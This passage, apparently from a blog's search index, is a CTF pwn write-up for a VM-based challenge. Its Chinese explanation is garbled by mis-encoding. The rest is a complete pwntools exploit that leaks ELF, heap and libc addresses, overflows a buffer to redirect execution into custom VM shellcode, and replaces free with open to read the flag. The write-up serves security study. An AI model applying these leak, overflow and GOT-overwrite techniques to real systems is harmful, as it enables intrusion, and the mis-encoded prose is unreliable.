<code>orw</code>ï¼Œä¸”æ²¡æœ‰ç»™<code>open</code>çš„ <code>syscall</code>åªèƒ½æ³„æ¼</p><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>å› æ­¤æ€è·¯å°±æ˜¯ï¼Œå…ˆåˆ©ç”¨<code>puts</code>æ³„æ¼<code>elf</code>çš„åœ°å€ï¼Œç„¶åå†<code>ret</code>åˆ°æœ€åˆ<code>elf_code+0x3</code>ç„¶åå†æ³„æ¼<code>heap</code>ï¼Œ<code>ret</code>åˆ°å†™å…¥æ ˆä¸Šçš„<code>shellcode</code></p><p>åˆ©ç”¨<code>puts</code>æ³„æ¼<code>libc</code>ï¼Œç„¶åå†æ¬¡è¾“å…¥åˆ°æ ˆä¸Šï¼Œåˆ©ç”¨<code>\x6d: mov reg[0], 0</code>ä½œä¸º<code>nop</code>ï¼Œç¼–å†™<code>shellcode</code></p><p>ç„¶åå°†<code>open</code>å†™å…¥<code>free</code>çš„ä½ç½®ï¼Œå› æ­¤åœ¨è°ƒç”¨<code>syscall 03</code>æ—¶å°±æ˜¯è°ƒç”¨<code>open</code>ï¼Œæœ€ååˆ©ç”¨<code>orw</code>è¿›è¡Œè¯»å–<code>flag</code></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="hljs python"><span class="hljs-comment"># heap+0x2e68 =&gt; elf_bss</span>io.sendafter(<span class="hljs-string">&quot;name:&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0xff</span>+<span class="hljs-string">&quot;#&quot;</span>)io.recvuntil(<span class="hljs-string">&quot;#&quot;</span>)elf.address = u64(io.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">&quot;\x00\x00&quot;</span>) - <span class="hljs-number">0x203851</span>success(<span class="hljs-string">&quot;elf&quot;</span>, elf.address)<span class="hljs-comment"># 0xf8 + ret </span>io.sendafter(<span class="hljs-string">&quot;say:&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x100</span> + p64(elf.address + <span class="hljs-number">0x203023</span>))io.sendafter(<span class="hljs-string">&quot;name:&quot;</span>, <span class="hljs-string">&quot;\x50&quot;</span>)heap = u64(io.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">&quot;\x00\x00&quot;</span>) - <span class="hljs-number">0x50</span>success(<span class="hljs-string">&quot;heap&quot;</span>, heap)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">mov reg[0], read_got</span><span class="hljs-string">puts</span><span class="hljs-string">mov reg[0], 0</span><span class="hljs-string">mov reg[1], heap + addr</span><span class="hljs-string">mov reg[2], 0x1000</span><span class="hljs-string">read        </span><span class="hljs-string">//  use 0x6d: mov reg[0], 0 as nop</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>payload = <span class="hljs-string">&quot;\x11&quot;</span> + p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])payload += <span class="hljs-string">&quot;\x8f\x02&quot;</span>payload += <span class="hljs-string">&quot;\x6d&quot;</span>payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(heap+<span class="hljs-number">0x2d60</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x1000</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;A&quot;</span>)payload += p64(heap+<span class="hljs-number">0x2d60</span>)io.sendafter(<span class="hljs-string">&quot;say:&quot;</span>, payload)io.recvuntil(<span class="hljs-string">&quot;bye~\n&quot;</span>)libc.address = u64(io.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>)) - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">flag</span><span class="hljs-string">0x6d * 0x50</span><span class="hljs-string">mov reg[1], elf.address+0x203900</span><span class="hljs-string">mov reg[2], 8</span><span class="hljs-string">read</span><span class="hljs-string">mov reg[0], heap+0x2d60</span><span class="hljs-string">mov reg[1], 0</span><span class="hljs-string">open</span><span class="hljs-string">mov reg[0], 3</span><span class="hljs-string">mov reg[1], bss</span><span class="hljs-string">mov reg[2], 0x30</span><span class="hljs-string">read</span><span class="hljs-string">mov reg[0], 1</span><span class="hljs-string">mov reg[1], bss</span><span class="hljs-string">mov reg[2], 0x30</span><span class="hljs-string">write</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>payload = <span class="hljs-string">&quot;flag\x00&quot;</span>payload = payload.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">&quot;\x6d&quot;</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.address+<span class="hljs-number">0x2038f8</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">8</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(heap+<span class="hljs-number">0x2d60</span>)payload += <span class="hljs-string">&quot;\x6e&quot;</span>payload += <span class="hljs-string">&quot;\x8f\x03&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(<span class="hljs-number">3</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.bss()+<span class="hljs-number">0x400</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x30</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(<span class="hljs-number">1</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.bss()+<span class="hljs-number">0x400</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x30</span>)payload += <span class="hljs-string">&quot;\x8f\x01&quot;</span>io.send(payload)sleep(<span class="hljs-number">0.03</span>)io.send(p64(libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]))io.interactive()io.close()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>vm</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
